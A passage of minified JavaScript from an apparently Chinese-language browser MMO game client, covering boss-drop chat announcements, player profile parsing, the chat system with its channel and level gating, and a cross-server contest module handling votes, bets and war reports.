T=t.readByte(),w=t.readByte(),I=t.readShort();l.GlobalConfig.ItemConfig[m];0==g.type&&1==m?h.gold=y:r.push({id:m,count:y,quality:C,isSpecial:T,isAutoResolve:w,resolveGold:I}),b.DropHelp.addDrop([0!=b.DropHelp.tempDropPoint.x?b.DropHelp.tempDropPoint.x:Math.floor((null===(e=p.SubRoles.lookAtTar)||void 0===e?void 0:e.x)/d.GameMap.CELL_SIZE)||1,0!=b.DropHelp.tempDropPoint.y?b.DropHelp.tempDropPoint.y:Math.floor((null===(i=p.SubRoles.lookAtTar)||void 0===i?void 0:i.y)/d.GameMap.CELL_SIZE)||1,g,C])}return h.itemList=r,this.dropItemInfoToChat(h),b.DropHelp.start(),n},e.prototype.dropItemInfoToChat=function(t,e){void 0===e&&(e=y.TagChanneID.ciChannelSystem);for(var i=l.GlobalConfig.MonstersConfig[t.bossId],n=gettext("击杀了{0},经验值+{1}","|C:"+g.ItemUtil.getQualityColor(i.quality)+"&T:"+i.name+"|",t.exp),o=t.itemList.length,s=[],a=[],r=[],h=0;o>h;h++){var u=t.itemList[h];u&&(1==u.isSpecial?a.push({id:u.id,count:u.count,quality:u.quality}):0==u.isAutoResolve?s.push({id:u.id,count:u.count,quality:u.quality}):r.push({id:u.id,count:u.count,quality:u.quality,resolveGold:u.resolveGold}))}t.extraExp>0&&(n+=gettext("(+{0})",t.extraExp)),t.gold>0&&(n+=gettext(",金币*{0}",t.gold));var p;if(s.length>0){for(var d="",h=0,c=s.length;c>h;h++){var f=s[h],m=f.id,T=f.count,b=f.quality;p=l.GlobalConfig.ItemConfig[m],p?d+=""==d?"|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T:",|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T:console.error("配置表中不存在物品id "+m)}n+=gettext(",获得:{0}",d)}if(a.length>0){for(var d="",h=0,w=a.length;w>h;h++){var I=a[h],m=I.id,T=I.count,b=I.quality;p=l.GlobalConfig.ItemConfig[m],p?d+=""==d?"|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T:",|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T:console.error("配置表中不存在物品id "+m)}n+=gettext(",战神特权获得:{0}",d)}if(r.length>0){for(var d="",h=0,_=r.length;_>h;h++){var S=r[h],m=S.id,T=S.count,b=S.quality,x=S.resolveGold;p=l.GlobalConfig.ItemConfig[m],p?d+=""==d?"|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T+","+gettext("获得金币")+":"+x:",|C:"+g.ItemUtil.getQualityColor(b)+"&T:"+p.name+"|*"+T+","+gettext("获得金币")+":"+x:console.error("配置表中不存在物品id "+m)}n+=gettext(",自动回收了:{0}",d)}var D=getLangType();n+="cn"==D||"cn1"==D?"。":".",v.ChatCT.ins().postSysChatMsg(new C.ChatSystemData(e,n))},e.prototype.enterCDFun=function(){this.enterCD--},e.ins=function(){return t.ins.call(this)},__decorate([post()],e.prototype,"postEntityTeamId",null),__decorate([post()],e.prototype,"doTeamRoll",null),__decorate([post()],e.prototype,"teamAddRollItemS",null),__decorate([post()],e.prototype,"teamCheckTimeRollItemS",null),__decorate([post()],e.prototype,"teamRemoveRollItem",null),__decorate([post()],e.prototype,"doPostTeamPlayerInfo",null),__decorate([post()],e.prototype,"postChangeApplyList",null),__decorate([post()],e.prototype,"doTeamChange",null),__decorate([post()],e.prototype,"doPostTeamItemInfo",null),__decorate([post()],e.prototype,"doPostTeamList",null),__decorate([post()],e.prototype,"postBlackSmith",null),__decorate([post()],e.prototype,"postBossInfo",null),__decorate([post()],e.prototype,"postEnterCity",null),__decorate([post()],e.prototype,"postEscCity",null),__decorate([post()],e.prototype,"postChangeAttStatue",null),__decorate([post()],e.prototype,"postHudunPoint",null),__decorate([post()],e.prototype,"postEnterCD",null),__decorate([post()],e.prototype,"postBossRevelryState",null),__decorate([post()],e.prototype,"postMapBossList",null),__decorate([post()],e.prototype,"postMapDrop",null),e}(a.BaseSystem);e.CityCC=R,window.CityCC=R,__reflect(R.prototype,"CityCC",[]),Systemap.CityCC=function(){return R.ins()},window.CityCC=R},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OtherPlayerData=e.ReadPlayerCT=void 0;var n=i(14),o=i(48),s=i(46),a=i(74),r=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.Default,e.regNetMsg(16,e.postPlayerResult),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendFindPlayer=function(t,e){void 0===e&&(e=0);var i=this.getBytes(16);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postPlayerResult=function(t){var i=e.ins().otherPlayerData;return i||(i=new l),i.parser(t),win.close("ChatWin"),s.HegemonyCT.ins().isOpeningView?(s.HegemonyCT.ins().championInfoDic[i.id]&&(s.HegemonyCT.ins().championInfoDic[i.id].data=i),this.postGetPlayerResult(i)):a.ContestCT.ins().isOpeningView?this.postGetPlayerResult(i):win.open("RRoleWin",i),i},e.prototype.postGetPlayerResult=function(t){return t},__decorate([post()],e.prototype,"postGetPlayerResult",null),e}(n.BaseSystem);e.ReadPlayerCT=r,window.ReadPlayerCT=r,__reflect(r.prototype,"ReadPlayerCT",[]);var l=function(){function t(){this.roleData=[],this.lilianLv=0,this.zhanlingID=0,this.zhanlingLevel=0,this.shenfuLevel=0}return t.prototype.parser=function(t){this.id=t.readInt(),this.serverId=t.readInt(),this.name=t.readString(),this.level=t.readShort(),this.vipLevel=t.readShort(),this.zhuan=t.readShort(),this.lilianLv=t.readInt(),this.ce=t.readDouble(),this.guildId=t.readInt(),this.guildName=t.readString(),this.zhanlingID=t.readInt(),this.zhanlingLevel=t.readInt();for(var e=t.readShort(),i=0;e>i;i++)this.roleData[i]=new o.Role,this.roleData[i].parser(t);this.shenfuLevel=t.readInt()},t}();e.OtherPlayerData=l,window.OtherPlayerData=l,__reflect(l.prototype,"OtherPlayerData",[]),Systemap.ReadPlayerCT=function(){return r.ins()},window.ReadPlayerCT=r},function(t,e,i){"use strict";function n(t){var e=p.GameLogic.ins().getBytes(0);e.writeString(t),p.GameLogic.ins().sendToServer(e)}Object.defineProperty(e,"__esModule",{value:!0}),e.KeFuItemData=e.DropItemToChat=e.gm=e.ChatCT=void 0;var o=i(14),s=i(120),a=i(4),r=i(2),l=i(32),h=i(637),u=i(7),p=i(23),d=i(93),c=i(58),f=i(0),g=i(26),m=i(47),v=i(75),y=i(35),C=i(233),T=i(82),b=i(6),w=i(79),I=i(53),_=i(25),S=i(83),x=i(192),D=function(t){function e(){var e=t.call(this)||this;return e.isShowTip=!1,e.chatInterval=3e3,e.charMax=50,e.canSpeak=!0,e.UpSpeak="",e.chatListData5=[],e.canSpeakTime=0,e.MsgOpenWin=!0,e.info=[],e.cdCount=0,e.sysId=PackageID.Chat,e.regNetMsg(1,e.doNewChatMsg),e.regNetMsg(2,e.doSystemInfo),e.regNetMsg(3,e.doIsSendSuccess),e.regNetMsg(4,e.doSystemMessage),e.regNetMsg(5,e.doCannotSpeak),e.regNetMsg(7,e.delMsg),e.regNetMsg(8,e.doSystemMessageNew),e}return __extends(e,t),e.prototype.initLogin=function(){this._chatListData||(this._chatListData=new eui.ArrayCollection),this._systemListData||(this._systemListData=new eui.ArrayCollection),this._systemListKoData||(this._systemListKoData=new eui.ArrayCollection),this._chatListData2||(this._chatListData2=new eui.ArrayCollection),this._chatListData3||(this._chatListData3=new eui.ArrayCollection),this._chatKuaFuListData||(this._chatKuaFuListData=new eui.ArrayCollection),this._chatListData.removeAll(),this._systemListData.removeAll(),this._systemListKoData.removeAll(),this._chatListData2.removeAll(),this._chatListData3.removeAll(),this._chatKuaFuListData.removeAll()},e.ins=function(){return t.ins.call(this)},e.prototype.sendChatInfo=function(t,e,i,n){return void 0===i&&(i=0),void 0===n&&(n=!1),__awaiter(this,void 0,void 0,function(){var o,a,r,l,h,u,p,d;return __generator(this,function(c){switch(c.label){case 0:return"@"==e.charAt(0)?(o=this.getBytes(0),o.writeString(e),this.sendToServer(o),[2]):(a=[null,s.TagChanneID.ciChannelAll,s.TagChanneID.ciChannelGuild,s.TagChanneID.ciChannelSecret,s.TagChanneID.ciChannelBigTeam,null,s.TagChanneID.ciChannelKuaFu],r=a.indexOf(t),0>r&&(r=5),l=0,!this.isCheckStr()||n?[3,2]:[4,platform.checkStr(e,1,r)]);case 1:h=c.sent(),u=h.result,p=h.content,e=p,c.label=2;case 2:return d=this.getBytes(1),d.writeByte(t),d.writeInt(i),d.writeString(e),d.writeByte(l),this.sendToServer(d),[2]}})})},e.prototype.isCheckStr=function(){var t=f.GlobalConfig.ChatConstConfig,e=urlParam.apptype;for(var i in t.chatUnshield)if(e==t.chatUnshield[i])return!1;return!0},e.prototype.isCheckOpen=function(){var t=f.GlobalConfig.ChatConstConfig,e=urlParam.apptype;for(var i in t.chatUnconditional)if(e==t.chatUnconditional[i])return!1;return!0},e.prototype.checkLvAndRecharge=function(t){if(void 0===t&&(t=0),platform.canSpeakAnyLv())return!0;var e,i=f.GlobalConfig.ChatConstConfig.openLevel,n=f.GlobalConfig.ChatConstConfig.kfOpenLevel,o=urlParam?urlParam.apptype:"";if(o){var s=f.GlobalConfig.ChatConstConfig.chatConditionIngot?f.GlobalConfig.ChatConstConfig.chatConditionIngot[o]:0,l=f.GlobalConfig.ChatConstConfig.kfChatConditionIngot?f.GlobalConfig.ChatConstConfig.kfChatConditionIngot[o]:0;2==t?l?n>a.ActorCC.level&&l>_.Recharge.ins().totalRechargeAmount&&(e=gettext("充值{0}元宝或到达{1}级解锁聊天",l,n)):l>a.ActorCC.level&&(e=gettext("到达{0}级解锁聊天",l)):(0==t||1==t)&&s?i>a.ActorCC.level&&s>_.Recharge.ins().totalRechargeAmount&&(e=gettext("充值{0}元宝或到达{1}级解锁聊天",s,i)):i>a.ActorCC.level&&(e=gettext("到达{0}级解锁聊天",i))}else 2==t&&n>a.ActorCC.level?e=gettext("到达{0}级解锁聊天",n):i>a.ActorCC.level&&(e=gettext("到达{0}级解锁聊天",i));return e?(r.TipsCT.ins().showTips(e),!1):!0},e.prototype.doNewChatMsg=function(t){var e=new s.ChatInfoData(t);-1==d.Friends.ins().indexOfBlackList(e.id)&&this.insertChatMsg(e)},e.prototype.createNewChatMsg=function(t,i,n,o){void 0===o&&(o=!1);var a=new s.ChatInfoData(null);if(a.name=gettext("系统"),a.str=t,!i&&n){var r=f.GlobalConfig.LanguageConfig[n];r&&(i=2==r.channel?s.TagChanneID.ciChannelKuaFu:s.TagChanneID.ciChannelAll)}i=i?i:s.TagChanneID.ciChannelAll,a.type=i,o?e.ins().insertChatMsg(a,!0):e.ins().insertChatMsg(a)},e.prototype.insertChatMsg=function(t,e){if(void 0===e&&(e=!1),this._chatListData||(this._chatListData=new eui.ArrayCollection),this._chatListData.length>=this.charMax){var i=this._chatListData.removeItemAt(0);this.removeAllChatMsg(i)}if(e)t.type==s.TagChanneID.ciChannelKuaFu?this.insertKuaFuListData(t,this._chatKuaFuListData):this._chatListData.addItem(t);else if(t.type==s.TagChanneID.ciChannelKuaFu){if(!this.isRepeat(this._chatKuaFuListData,t))return;this.insertKuaFuListData(t,this._chatKuaFuListData)}else{if(!this.isRepeat(this._chatListData,t))return;this._chatListData.addItem(t)}this.insertAllChatMsg(t),this.postNewChatMsg(t)},e.prototype.insertKuaFuListData=function(t,e){t&&t.type==s.TagChanneID.ciChannelKuaFu&&e.addItem(t)},e.prototype.createNewChatMsg1=function(t){var i=new s.ChatInfoData(null);i.name=gettext("系统"),i.str=t;var n=s.TagChanneID.ciChannelAll;i.type=n,e.ins().insertChatMsg1(i)},e.prototype.insertChatMsg1=function(t){if(this._chatListData||(this._chatListData=new eui.ArrayCollection),this._chatListData.length>=this.charMax){var e=this._chatListData.removeItemAt(0);this.removeAllChatMsg(e)}this._chatListData.addItem(t),this.insertAllChatMsg(t),this.postNewChatMsg(t)},e.prototype.delMsg=function(t){for(var e=t.readInt(),i=!1,n=this._chatListData.source.length,o=0;n>o;o++){var s=this._chatListData.source[o];s.id==e&&(this._chatListData.removeItemAt(o),o--,n--,i=!0)}n=this._chatListData2.source.length;for(var o=0;n>o;o++){var s=this._chatListData2.source[o];s.id==e&&(this._chatListData2.removeItemAt(o),o--,n--,i=!0)}n=this._chatListData3.source.length;for(var o=0;n>o;o++){var s=this._chatListData3.source[o];s.id==e&&(this._chatListData3.removeItemAt(o),o--,n--,i=!0)}i&&this.postDelMsg(e)},e.prototype.isRepeat=function(t,e){for(var i=0;i<t.source.length;i++)if(t.source[i].id==e.id&&t.source[i].str==e.str)return!1;return!0},e.prototype.resetCD=function(){for(var t in this.info)this.info[t].cd>0?this.info[t].cd--:this.info[t].cd=0;0==this.info.length&&Timer.stop(this.resetCD,this)},e.prototype.insertAllChatMsg=function(t){var e=this;this._chatListData2||(this._chatListData2=new eui.ArrayCollection);var i=!!t.content;i&&0==this._chatListData2.length?Timer.start(5e3,1,function(){t.type==s.TagChanneID.ciChannelKuaFu?e.insertKuaFuListData(t,e._chatListData2):e._chatListData2.addItem(t),e._chatListData3.length>=e.charMax&&e._chatListData3.removeItemAt(0),t.type==s.TagChanneID.ciChannelKuaFu?e.insertKuaFuListData(t,e._chatListData3):e._chatListData3.addItem(t)},this):(t.type==s.TagChanneID.ciChannelKuaFu?this.insertKuaFuListData(t,this._chatListData2):this._chatListData2.addItem(t),this._chatListData3.length>=this.charMax&&this._chatListData3.removeItemAt(0),t.type==s.TagChanneID.ciChannelKuaFu?this.insertKuaFuListData(t,this._chatListData3):this._chatListData3.addItem(t)),i&&(t.cd=120,this.info.push(t)),Timer.has(this.resetCD,this)||Timer.start(1e3,0,this.resetCD,this),!Timer.has(this.updateTime,this)&&this.info.length>0&&Timer.start(1e3,0,this.updateTime,this)},e.prototype.updateTime=function(){for(var t in this.info)!this.info[t].cd&&this._chatListData2.getItemIndex(this.info[t])>=0&&(this._chatListData2.removeItemAt(this._chatListData2.getItemIndex(this.info[t])),this.info.splice(this.info.indexOf(this.info[t]),1));0==this.info.length&&Timer.stop(this.updateTime,this)},e.prototype.removeAllChatMsg=function(t){var e=this._chatListData2.getItemIndex(t);e>=0&&this._chatListData2.removeItemAt(e)},e.prototype.postNewChatMsg=function(t){return t},e.prototype.postDelMsg=function(t){return t},e.prototype.doSystemInfo=function(t){},e.prototype.doIsSendSuccess=function(t){t.readBoolean()&&this.postSendInfoSuccess()},e.prototype.postSendInfoSuccess=function(){},e.prototype.doSystemMessage=function(t){var e=t.readInt(),i=t.readInt(),n=t.readString();if(0==e||a.ActorCC.level>=e)switch(i){case 512:r.TipsCT.ins().showBottomCenterTips(n);break;case 8:r.TipsCT.ins().showCenterTips2(n);break;case 4:h.ErrorLog.ins().show(n);break;case 2:r.TipsCT.ins().showCenterTips(n);break;default:r.TipsCT.ins().showTips(n)}},e.prototype.doCannotSpeak=function(t){this.canSpeakTime=t.readInt()},e.prototype.doSystemMessageNew=function(t){var e=t.readInt(),i=t.readInt(),n=t.readString(),o=t.readString(),s=c.LangUtils.analysis(n,o);if(0==e||a.ActorCC.level>=e)switch(i){case 512:r.TipsCT.ins().showBottomCenterTips(s);break;case 8:r.TipsCT.ins().showCenterTips2(s);break;case 4:h.ErrorLog.ins().show(s);break;case 2:r.TipsCT.ins().showCenterTips(s);break;default:r.TipsCT.ins().showTips(s)}},e.prototype.isCanSpeak=function(){return this.canSpeakTime>u.GameServerCC.serverTime/1e3?!1:!0},Object.defineProperty(e.prototype,"chatListData",{get:function(){return this._chatListData||(this._chatListData=new eui.ArrayCollection),this._chatListData},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"chatListData2",{get:function(){return this._chatListData2||(this._chatListData2=new eui.ArrayCollection),this._chatListData2},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"chatListData3",{get:function(){return this._chatListData3||(this._chatListData3=new eui.ArrayCollection),this._chatListData3},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"chatKuaFuListData",{get:function(){return this._chatKuaFuListData||(this._chatKuaFuListData=new eui.ArrayCollection),this._chatKuaFuListData},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"chatListTip",{get:function(){this._chatListData||(this._chatListData=new eui.ArrayCollection([]));var t,e,i=this._chatListData.length;return i>2?(t=i-2,e=i):(t=0,e=i),this._chatListData.source.slice(t,e)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"chatListTip2",{get:function(){var t=this._chatListData2;return l.FbCT.ins().isFBChatChannle()&&(t=l.FbCT.ins().chatCampDtList),t||(t=new eui.ArrayCollection([])),urlParam.isAliPayGame?t.source[t.source.length-1]:t.source},enumerable:!1,configurable:!0}),e.prototype.startInterval=function(){this.canSpeak=!1,Timer.start(this.chatInterval,1,this.timeDo,this)},e.prototype.timeDo=function(){this.canSpeak=!0},e.prototype.postSysChatMsg=function(t){if(this._systemListData){if(this._systemListData.length>=this.charMax){var e=this._systemListData.removeItemAt(0);this.removeAllChatMsg(e)}if(this._systemListKoData){if(this._systemListKoData.length>=this.charMax){var i=this._systemListKoData.removeItemAt(0);this.removeAllChatMsg(i)}-1!=t.str.indexOf(gettext("击杀了"))&&this._systemListKoData.addItem(t)}return I.ControlCC.isHideNoticeKillDrop&&-1!=t.str.indexOf(gettext("击杀了"))||(this._systemListData.addItem(t),this.insertAllChatMsg(t)),t}},Object.defineProperty(e.prototype,"systemListData",{get:function(){return this._systemListData||(this._systemListData=new eui.ArrayCollection([])),this._systemListData},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"systemListKoData",{get:function(){return this._systemListKoData||(this._systemListKoData=new eui.ArrayCollection([])),this._systemListKoData},enumerable:!1,configurable:!0}),e.prototype.checkRepeatString=function(t){var e=t.length;if(10>=e)return!0;for(var i=0,n=0;e>n;n++){var o=t.charAt(n);-1!=this.UpSpeak.lastIndexOf(o)&&++i}return i>=10&&!this.isServerZoneOpen()?(r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:输入的内容重复过多|")),!1):!0},e.prototype.isServerZoneOpen=function(){var t=f.GlobalConfig.RoleBaseConfig.ChatUnlimitServer;if(!t||!t.length||!t[0])return!1;var e=u.GameServerCC.serverID;return t.some(function(t){var i=t[0],n=t[1];return e>=i&&n>=e})},Object.defineProperty(e.prototype,"kefuListData",{get:function(){return this.chatListData5},enumerable:!1,configurable:!0}),e.prototype.postKfChatMsg=function(t){this.chatListData5.push(t)},e.prototype.handleTxtLink=function(t,i){var n=t.str||t.content,o=n.indexOf("|E:");n=n.slice(o+3,Number.MAX_VALUE);var s;if(n.indexOf(",")>=0?s=n.split(","):n.indexOf("*")>=0&&(s=n.split("*")),"1"==s[0])return f.GlobalConfig.TeamFuBenBaseConfig.needZsLv>g.ZsCT.ins().stage?void r.TipsCT.ins().showTips(gettext("{0}转后可以挑战",f.GlobalConfig.TeamFuBenBaseConfig.needZsLv)):void l.FbCT.ins().sendEnterTFRoom(+s[1]);if("2"==s[0])return void m.KfArenaSys.ins().sendJoinTeam(+s[1]);if("7"==s[0])v.BurningDesertCT.ins().reqEnterRoom(+s[1]);else{if("8"==s[0])return f.GlobalConfig.TeamFuBenBaseConfig.needZsLv>g.ZsCT.ins().stage?void r.TipsCT.ins().showTips(gettext("{0}转后可以挑战",f.GlobalConfig.TeamFuBenBaseConfig.needZsLv)):void l.FbCT.ins().sendEnterPurgatoryTFRoom(+s[1]);if("9"==s[0]){var a=y.TaskCT.ins().checkQiyuBossOpen();a?win.open(C.QiyuBossWin):r.TipsCT.ins().showTips(gettext("奇遇boss已逃跑"))}else{if("10"==s[0]){var h=win.openCheck("InvadeWin");return void(h&&(T.InvadeCT.ins().invadeTeamDatas&&T.InvadeCT.ins().invadeTeamDatas.length>0?r.TipsCT.ins().showTips(gettext("已经在别的房间")):T.InvadeCT.ins().sendJoinTeam(+s[1])))}if("11"==s[0]){var h=0!=w.SixReisCT.ins().tfMembers.length;return void(w.SixReisCT.ins().tfMembers&&w.SixReisCT.ins().tfMembers.length>0?r.TipsCT.ins().showTips(gettext("已经在别的房间")):w.SixReisCT.ins().postInTeam(+s[1]))}"12"==s[0]&&x.StardomainWin.openCheck()&&S.StardomainCT.ins().reqEnterRoom(+s[1])}}var u=i.split(",");i&&Number(u[0])&&Number(u[1])&&(e.ins().MsgOpenWin=!1,b.BagCT.ins().sendLookEquipTip(Number(u[0]),Number(u[1])))},__decorate([post()],e.prototype,"postNewChatMsg",null),__decorate([post()],e.prototype,"postDelMsg",null),__decorate([post()],e.prototype,"postSendInfoSuccess",null),__decorate([post()],e.prototype,"postSysChatMsg",null),__decorate([post()],e.prototype,"postKfChatMsg",null),e}(o.BaseSystem);e.ChatCT=D,window.ChatCT=D,__reflect(D.prototype,"ChatCT",[]),e.gm=n,window.gm=n,window.gm=n,Systemap.ChatCT=function(){return D.ins()},window.ChatCT=D;var A=function(){function t(){this.itemList=[]}return t}();e.DropItemToChat=A,window.DropItemToChat=A,__reflect(A.prototype,"DropItemToChat",[]);var k=function(){function t(){}return t}();e.KeFuItemData=k,window.KeFuItemData=k,__reflect(k.prototype,"KeFuItemData",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HegemonyStatus=e.HegemonyCT=void 0;var n=i(210),o=i(8),s=i(14),a=i(0),r=i(15),l=i(32),h=i(12),u=i(7),p=i(2),d=i(26),c=function(t){function e(){var e=t.call(this)||this;return e.isInit=!1,e.state=0,e.voteData=[],e.challengeData=[],e.betData=[],e.betState=[],e.shopData=[],e.fightList=[],e.fightInfo=[],e.knockoutInfo=[],e.warData=[],e.againstInfo={},e.knockoutReport=[],e.player16Info=[],e.cFirstTap=!0,e.oFirstTap=!0,e.pFirstTap=!0,e.list=[],e.serverData=[],e.isOpenView=!1,e.isChange=!1,e.championInfoDic={},e.isOpeningView=!1,e.sysId=PackageID.Hegemony,e.regNetMsg(1,e.postInit),e.regNetMsg(2,e.postSignup),e.regNetMsg(3,e.postPoll),e.regNetMsg(4,e.postVote),e.regNetMsg(5,e.postChallenge),e.regNetMsg(6,e.postBetData),e.regNetMsg(7,e.postOneBetData),e.regNetMsg(8,e.postInitWorship),e.regNetMsg(9,e.postWorship),e.regNetMsg(10,e.postInitShop),e.regNetMsg(11,e.postHegemonyShop),e.regNetMsg(12,e.postRoundEnd),e.regNetMsg(13,e.postFightEnd),e.regNetMsg(14,e.postCountdown),e.regNetMsg(15,e.postState),e.regNetMsg(16,e.postKnockoutData),e.regNetMsg(17,e.postWarReport),e.regNetMsg(18,e.postAgainst),e.regNetMsg(19,e.postKnockoutReport),e.regNetMsg(20,e.postPlayer16Info),e.regNetMsg(21,e.postChampion),e.regNetMsg(22,e.postCurRound),e.regNetMsg(23,e.postFightInfo),e.regNetMsg(24,e.postServerInfo),e
}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postInit=function(t){this.isInit=!0,this.NO=t.readShort();var e=this.state;this.state=t.readByte(),e!=this.state&&(this.isChange=!0),this.group=t.readByte(),this.isSignup=t.readByte(),this.isVote=t.readByte(),this.endTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.openTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.delegate=t.readInt(),this.nextOpenTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt())},e.prototype.postSignup=function(t){this.canSignup=t.readByte(),this.isSignup=t.readByte()},e.prototype.postPoll=function(t){this.voteEndTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt());var e=t.readShort();this.voteData=[];for(var i=0;e>i;i++)this.voteData[i]={index:0,id:t.readInt(),name:t.readString(),power:t.readUnsignedInt(),poll:t.readInt(),job:t.readByte(),guildName:t.readString()}},e.prototype.postVote=function(t){this.isVote=t.readByte();for(var e=t.readInt(),i=0;i<this.voteData.length;i++)this.voteData[i].id==e&&(this.voteData[i].poll=t.readInt());var n=a.GlobalConfig.LfRaceBase.voteReward[0];if(n){var o=a.GlobalConfig.ItemConfig[n.id];p.TipsCT.ins().showCenterTips(gettext("投票成功")+"，"+(null===o||void 0===o?void 0:o.name)+"x"+n.count)}},e.prototype.postChallenge=function(t){this.tzEndTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.isBattle=t.readByte();var e=t.readUnsignedInt();this.tzBattleTime=o.DateUtils.formatMiniDateTime(e),this.challengeData=[];var i={state:t.readByte(),winner:t.readInt(),beServer:t.readInt(),beChoose:t.readInt(),beChooseName:t.readString(),bePoll:t.readInt(),beRole:t.readByte(),beSex:t.readByte(),server:t.readInt(),challenger:t.readInt(),challengerName:t.readString(),poll:t.readInt(),role:t.readByte(),sex:t.readByte(),beTitleId:t.readInt(),beOutward:t.readInt(),beWingId:t.readString(),beDemonCir:t.readInt(),beLevel:t.readInt(),titleId:t.readInt(),outward:t.readInt(),wingId:t.readString(),demonCir:t.readInt(),level:t.readInt()};this.challengeData.push(i),!this.isBattle&&this.challengeData[0]&&this.challengeData[0].state>0&&this.sendWarData(this.NO,this.group,0)},e.prototype.SC_99_5=function(t){t.readUnsignedInt(),t.readByte(),t.readUnsignedInt(),t.readByte(),t.readInt(),t.readInt(),t.readInt(),t.readString(),t.readInt(),t.readByte(),t.readByte(),t.readInt(),t.readInt(),t.readString(),t.readInt(),t.readByte(),t.readByte(),t.readInt(),t.readInt(),t.readString(),t.readInt(),t.readInt(),t.readInt(),t.readInt(),t.readString(),t.readInt(),t.readInt()},e.prototype.postBetData=function(t){this.betData=[];for(var e=t.readByte(),i=0;e>i;i++){for(var n={index:t.readByte(),result:t.readByte(),group:t.readByte(),state:t.readByte(),id:t.readShort(),serverId:t.readInt(),cost:t.readInt(),betAwards:[]},o=t.readByte(),s=0;o>s;s++){var a={type:t.readInt(),id:t.readInt(),count:t.readInt()};n.betAwards.push(a)}this.betData.push(n)}this.betState=[];for(var r=t.readByte(),l=0;r>l;l++)this.betState[t.readByte()]=t.readByte()},e.prototype.postOneBetData=function(t){var e=t.readByte(),i=t.readByte(),n=!0;for(var o in this.betData)if(this.betData[o].index==i){n=!1;break}var s=t.readByte(),a=t.readByte();if(this.betState[a]&&(this.betState[a]=e),n){for(var r={index:i,result:s,group:a,state:t.readByte(),id:t.readShort(),serverId:t.readInt(),cost:t.readInt(),betAwards:[]},l=t.readByte(),h=0;l>h;h++){var u={type:t.readInt(),id:t.readInt(),count:t.readInt()};r.betAwards.push(u)}this.betData.push(r)}},e.prototype.postInitWorship=function(t){this.worshipNo=t.readShort(),this.serverId=t.readInt(),this.curServer=t.readInt(),this.player=t.readInt(),this.worshipNum=t.readShort(),this.leftWordship=t.readShort()},e.prototype.postWorship=function(t){this.worshipNum=t.readShort(),this.leftWordship=t.readShort()},e.prototype.postInitShop=function(t){for(var e=t.readShort(),i=0;e>i;i++)this.shopData[t.readShort()]=t.readInt()},e.prototype.postHegemonyShop=function(t){this.shopData[t.readShort()]=t.readInt()},e.prototype.postRoundEnd=function(t){this.fightNumber=t.readByte();for(var e=t.readByte(),i=t.readByte(),n=[],o=0;i>o;o++)n[t.readByte()]={serverId:t.readInt(),name:t.readString(),roleDie:[0==t.readInt(),0==t.readInt(),0==t.readInt()],result:t.readByte()};this.list[e]=n,this.fightList[this.fightNumber]=this.list},e.prototype.postFightEnd=function(t){this.fightNumber=t.readByte(),this.fightInfo=[];for(var e=t.readByte(),i=0;e>i;i++){var o=t.readByte();this.fightInfo[o]={name:t.readString(),serverId:t.readInt(),round:t.readInt()}}this.fightResult=t.readByte(),n.ResultManager.ins().create(l.FbCT.FB_TYPE_HEGEMONY,this.fightResult,this.roleSex1,this.roleSex2,this.fightList[this.fightNumber],this.fightInfo)},e.prototype.postCountdown=function(t){this.countdownType=t.readByte(),this.countdown=t.readUnsignedInt()},e.prototype.postState=function(t){this.NO=t.readShort(),this.group=t.readByte();var e=this.state;this.state=t.readByte(),e!=this.state&&(this.isChange=!0),this.endTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.openTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.delegate=t.readInt(),this.nextOpenTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt())},e.prototype.postKnockoutData=function(t){this.knockoutInfo=[];for(var e={round:t.readByte(),servers:t.readShort(),nextTimes:t.readUnsignedInt(),knockoutData:[]},i=t.readByte(),n=0;i>n;n++){var o={round:n+1,serverid:t.readInt(),name:t.readString(),isWin:t.readByte()};e.knockoutData.push(o)}this.knockoutInfo.push(e)},e.prototype.postWarReport=function(t){this.warData=[];for(var e={NO:t.readShort(),group:t.readByte(),id:t.readShort(),state:t.readByte(),server1:t.readInt(),server2:t.readInt(),name1:t.readString(),name2:t.readString(),score1:t.readByte(),score2:t.readByte(),role1:[t.readByte(),t.readByte(),t.readByte()],role2:[t.readByte(),t.readByte(),t.readByte()],winner:t.readByte(),winType:t.readByte(),fightData:[]},i=t.readByte(),n=0;i>n;n++){for(var o={fightNo:t.readByte(),winner:t.readByte(),score1:t.readByte(),score2:t.readByte(),roundData:[]},s=t.readByte(),a=0;s>a;a++){var r={winner:t.readByte(),winType:t.readByte()};o.roundData.push(r)}e.fightData.push(o)}this.warData.push(e)},e.prototype.postAgainst=function(t){var e=t.readShort();this.againstInfo[e]||(this.againstInfo[e]=[]);var i=t.readByte();this.againstInfo[e][i]=[];for(var n=t.readByte(),s=0;n>s;s++){var 